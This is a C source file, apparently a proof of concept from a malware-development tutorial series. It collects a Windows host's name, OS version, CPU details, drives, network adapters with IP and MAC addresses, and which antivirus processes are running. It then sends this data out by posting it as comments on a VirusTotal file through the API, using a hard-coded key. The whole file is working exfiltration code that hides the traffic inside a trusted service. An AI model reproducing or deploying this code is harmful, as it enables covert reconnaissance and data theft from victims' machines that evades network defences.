/*
 * hack3.c
 * sending systeminfo via legit URL. VirusTotal API
 * author @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <iphlpapi.h>

#define VT_API_KEY "7e7778f8c29bc4b171512caa6cc81af63ed96832f53e7e35fb706dd320ab8c42"
#define FILE_ID "379698a4f06f18cb3ad388145cf62f47a8da22852a08dd19b3ef48aaedffd3fa"

// define a struct to store process name and description
typedef struct {
  char process_name[256];
  char description[256];
} Process;

// array of Process structs, and counter
Process* process_list;
int process_count = 0;

// send data to VirusTotal using winhttp
int sendToVT(const char* comment) {
  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL;

  hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (hSession == NULL) {
    fprintf(stderr, "WinHttpOpen. Error: %d has occurred.\n", GetLastError());
    return 1;
  }

  hConnect = WinHttpConnect(hSession, L"www.virustotal.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (hConnect == NULL) {
    fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hSession);
  }

  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v3/files/" FILE_ID "/comments", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (hRequest == NULL) {
    fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
  }

  // construct the request body
  char json_body[1024];
  snprintf(json_body, sizeof(json_body), "{\"data\": {\"type\": \"comment\", \"attributes\": {\"text\": \"%s\"}}}", comment);

  // set the headers
  if (!WinHttpSendRequest(hRequest, L"x-apikey: " VT_API_KEY "\r\nUser-Agent: vt v.1.0\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/json", -1, (LPVOID)json_body, strlen(json_body), strlen(json_body), 0)) {
    fprintf(stderr, "WinHttpSendRequest. Error %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  BOOL hResponse = WinHttpReceiveResponse(hRequest, NULL);
  if (!hResponse) {
    fprintf(stderr, "WinHttpReceiveResponse. Error %d has occurred.\n", GetLastError());
  }

  DWORD code = 0;
  DWORD codeS = sizeof(code);
  if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &code, &codeS, WINHTTP_NO_HEADER_INDEX)) {
    if (code == 200) {
      printf("comment posted successfully.\n");
    } else {
      printf("failed to post comment. HTTP Status Code: %d\n", code);
    }
  } else {
    DWORD error = GetLastError();
    LPSTR buffer = NULL;
    FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                   NULL, error, 0, (LPSTR)&buffer, 0, NULL);
    printf("WTF? unknown error: %s\n", buffer);
    LocalFree(buffer);
  }

  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hSession);

  printf("successfully send info via VT API :)\n");
  return 0;
}

// read process data from a file
void readProcListFromFile(const char* filename) {
  FILE* file = fopen(filename, "r");
  if (file == NULL) {
    printf("Could not open file %s", filename);
    return;
  }

  char line[512];
  while (fgets(line, sizeof(line), file)) {
    // reallocate memory for each new process
    process_list = (Process*)realloc(process_list, (process_count + 1) * sizeof(Process));
    // parse the line, split it into process name and description
    char* token = strtok(line, "|");
    strcpy(process_list[process_count].process_name, token);
    token = strtok(NULL, "|");
    strcpy(process_list[process_count].description, token);
    process_count++;
  }

  fclose(file);
}

// enumerate running processes
void enumProcs() {
  HANDLE hProcessSnap;
  PROCESSENTRY32 pe32;

  hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hProcessSnap == INVALID_HANDLE_VALUE) {
    printf("CreateToolhelp32Snapshot failed.\n");
    return;
  }

  pe32.dwSize = sizeof(PROCESSENTRY32);

  if (!Process32First(hProcessSnap, &pe32)) {
    printf("Process32First failed.\n");
    CloseHandle(hProcessSnap);
    return;
  }


  char avInfo[4096]; 

  do {
    for (int i = 0; i < process_count; i++) {
      if (_stricmp(process_list[i].process_name, pe32.szExeFile) == 0) {
        printf("found process: %s - %s \n", process_list[i].process_name, process_list[i].description);
        snprintf(avInfo, sizeof(avInfo),
        "ProcessName: %s\n"
        "AVName: %s\n",
        process_list[i].process_name,
        process_list[i].description);
      }
    }
  } while (Process32Next(hProcessSnap, &pe32));

  int result = sendToVT(avInfo);
  
  if (result == 0) {
    printf("AV info ok =^..^=\n");
  } else {
    printf("AV info nok <3()~\n");
  }

  CloseHandle(hProcessSnap);
}

// get systeminfo and send as comment via VT API logic
int main(int argc, char* argv[]) {

  // test posting comment
//   const char* comment = "meow-meow";
//   sendToVT(comment);

  char systemInfo[4096];

  // Get host name
  CHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
  DWORD size = sizeof(hostName) / sizeof(hostName[0]);
  GetComputerNameA(hostName, &size);  // Use GetComputerNameA for CHAR

  // Get OS version
  OSVERSIONINFO osVersion;
  osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
  GetVersionEx(&osVersion);

  // Get system information
  SYSTEM_INFO sysInfo;
  GetSystemInfo(&sysInfo);

  // Get logical drive information
  DWORD drives = GetLogicalDrives();

  // Get IP address
  IP_ADAPTER_INFO adapterInfo[16];  // Assuming there are no more than 16 adapters
  DWORD adapterInfoSize = sizeof(adapterInfo);
  if (GetAdaptersInfo(adapterInfo, &adapterInfoSize) != ERROR_SUCCESS) {
    printf("GetAdaptersInfo failed. error: %d has occurred.\n", GetLastError());
    return false;
  }

  snprintf(systemInfo, sizeof(systemInfo),
    "Host Name: %s, "
    "OS Version: %d.%d.%d, "
    "Processor Architecture: %d, "
    "Number of Processors: %d, "
    "Logical Drives: %X, ",
    hostName,
    osVersion.dwMajorVersion, osVersion.dwMinorVersion, osVersion.dwBuildNumber,
    sysInfo.wProcessorArchitecture,
    sysInfo.dwNumberOfProcessors,
    drives);

  // Add IP address information
  for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter != NULL; adapter = adapter->Next) {
    snprintf(systemInfo + strlen(systemInfo), sizeof(systemInfo) - strlen(systemInfo),
    "Adapter Name: %s, "
    "IP Address: %s, "
    "Subnet Mask: %s, "
    "MAC Address: %02X-%02X-%02X-%02X-%02X-%02X",
    adapter->AdapterName,
    adapter->IpAddressList.IpAddress.String,
    adapter->IpAddressList.IpMask.String,
    adapter->Address[0], adapter->Address[1], adapter->Address[2],
    adapter->Address[3], adapter->Address[4], adapter->Address[5]);
  }

  int result = sendToVT(systemInfo);

  if (result == 0) {
    printf("ok =^..^=\n");
  } else {
    printf("nok <3()~\n");
  }

  readProcListFromFile("processes.txt");
  enumProcs();
  // cleanup allocated memory
  if (process_list) {
    free(process_list);
  }

  return 0;
}
